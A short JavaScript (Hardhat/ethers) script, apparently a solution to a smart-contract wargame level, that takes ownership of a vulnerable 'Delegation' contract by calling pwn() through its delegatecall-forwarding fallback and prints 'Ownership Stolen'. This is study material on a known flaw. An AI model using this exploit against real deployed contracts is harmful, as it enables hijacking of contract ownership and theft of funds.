const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x28d18cAD3601FfbE0329a264Cd3B26FAf8a561aa'
const abi = [
    "function pwn() public",
    "function owner() public view returns (address)"
]

async function hack(contract, signer) {
    // Fallback fx takes any call and forwards it with delegatecall.
    // Delegate call uses storage and data from the original transaction.
    // This means that pwn() updates the owner of the Delegation contract to you.
    const tx = await contract.pwn({gasLimit: 2000000});
    const receipt = await tx.wait();

    const owner = await contract.owner();
    console.log(`Ownership Stolen. New Owner: ${owner}`);
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})